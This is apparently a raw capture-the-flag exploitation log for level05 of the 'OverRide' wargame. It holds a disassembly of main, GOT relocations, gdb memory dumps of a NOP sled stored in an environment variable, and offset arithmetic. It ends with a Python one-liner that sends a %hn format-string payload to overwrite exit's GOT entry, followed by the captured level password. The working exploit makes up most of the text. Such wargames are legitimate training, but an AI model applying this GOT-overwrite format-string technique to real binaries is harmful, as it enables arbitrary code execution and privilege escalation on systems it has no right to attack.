08048444 <main>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       57                      push   %edi
 8048448:       53                      push   %ebx
 8048449:       83 e4 f0                and    $0xfffffff0,%esp
 804844c:       81 ec 90 00 00 00       sub    $0x90,%esp
 8048452:       c7 84 24 8c 00 00 00    movl   $0x0,0x8c(%esp)
 8048459:       00 00 00 00
 804845d:       a1 f0 97 04 08          mov    0x80497f0,%eax
 8048462:       89 44 24 08             mov    %eax,0x8(%esp)
 8048466:       c7 44 24 04 64 00 00    movl   $0x64,0x4(%esp)
 804846d:       00
 804846e:       8d 44 24 28             lea    0x28(%esp),%eax
 8048472:       89 04 24                mov    %eax,(%esp)
 8048475:       e8 d6 fe ff ff          call   8048350 <fgets@plt> 
 804847a:       c7 84 24 8c 00 00 00    movl   $0x0,0x8c(%esp)
 8048481:       00 00 00 00
 8048485:       eb 4c                   jmp    80484d3 <main+0x8f>
 8048487:       8d 44 24 28             lea    0x28(%esp),%eax
 804848b:       03 84 24 8c 00 00 00    add    0x8c(%esp),%eax
 8048492:       0f b6 00                movzbl (%eax),%eax
 8048495:       3c 40                   cmp    $0x40,%al
 8048497:       7e 32                   jle    80484cb <main+0x87>
 8048499:       8d 44 24 28             lea    0x28(%esp),%eax
 804849d:       03 84 24 8c 00 00 00    add    0x8c(%esp),%eax
 80484a4:       0f b6 00                movzbl (%eax),%eax
 80484a7:       3c 5a                   cmp    $0x5a,%al
 80484a9:       7f 20                   jg     80484cb <main+0x87>
 80484ab:       8d 44 24 28             lea    0x28(%esp),%eax
 80484af:       03 84 24 8c 00 00 00    add    0x8c(%esp),%eax
 80484b6:       0f b6 00                movzbl (%eax),%eax
 80484b9:       89 c2                   mov    %eax,%edx
 80484bb:       83 f2 20                xor    $0x20,%edx
 80484be:       8d 44 24 28             lea    0x28(%esp),%eax
 80484c2:       03 84 24 8c 00 00 00    add    0x8c(%esp),%eax
 80484c9:       88 10                   mov    %dl,(%eax)
 80484cb:       83 84 24 8c 00 00 00    addl   $0x1,0x8c(%esp)
 80484d2:       01
 80484d3:       8b 9c 24 8c 00 00 00    mov    0x8c(%esp),%ebx
 80484da:       8d 44 24 28             lea    0x28(%esp),%eax
 80484de:       c7 44 24 1c ff ff ff    movl   $0xffffffff,0x1c(%esp)
 80484e5:       ff
 80484e6:       89 c2                   mov    %eax,%edx
 80484e8:       b8 00 00 00 00          mov    $0x0,%eax
 80484ed:       8b 4c 24 1c             mov    0x1c(%esp),%ecx
 80484f1:       89 d7                   mov    %edx,%edi
 80484f3:       f2 ae                   repnz scas %es:(%edi),%al
 80484f5:       89 c8                   mov    %ecx,%eax
 80484f7:       f7 d0                   not    %eax
 80484f9:       83 e8 01                sub    $0x1,%eax
 80484fc:       39 c3                   cmp    %eax,%ebx
 80484fe:       72 87                   jb     8048487 <main+0x43>
 8048500:       8d 44 24 28             lea    0x28(%esp),%eax
 8048504:       89 04 24                mov    %eax,(%esp)
 8048507:       e8 34 fe ff ff          call   8048340 <printf@plt>
 804850c:       c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048513:       e8 58 fe ff ff          call   8048370 <exit@plt>


level05@OverRide:~$ objdump -R level05

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main

   0    1       2          3     4      5       6     7             8           9         10
 aaaa 0x64  0xf7fcfac0  (nil)  (nil)  (nil)  (nil)  0xffffffff  0xffffd774  0xf7fdb000  0x61616161


p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

adrr de /bin/sh 
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

>>> hex(0xf7e2c000 + 0x15d7ec)
'0xf7f897ec'



0xffffdb26:      "SC=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdbee:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdcb6:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220

(gdb) x/200w 0xffffdb26
0xffffdb26:     -1875033261     -1869574000     -1869574000     -1869574000
0xffffdb36:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdb46:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdb56:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdb66:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdb76:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdb86:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdb96:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdba6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdbb6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdbc6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdbd6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdbe6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdbf6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc06:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc16:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc26:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc36:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc46:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc56:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc66:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc76:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc86:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdc96:     -1869574000     -1869574000     -1869574000     -1869574000
---Type <return> to continue, or q <return> to quit---
0xffffdca6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdcb6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdcc6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdcd6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdce6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdcf6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd06:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd16:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd26:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd36:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd46:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd56:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd66:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd76:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd86:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdd96:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdda6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffddb6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffddc6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffddd6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffdde6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffddf6:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffde06:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffde16:     -1869574000     -1869574000     -1869574000     -1869574000
---Type <return> to continue, or q <return> to quit---
0xffffde26:     -1869574000     -1869574000     -1869574000     -1869574000
0xffffde36:     -1869574000     -1869574000     -1869574000     -1869574000

0xffffdbf6

ffff = 65535 - 56310 = 09225
dbf6 = 56310 - 8 = 56302

(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56302d%10$hn" + "%9225d%11$hn"'; cat)| ./level05 

h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq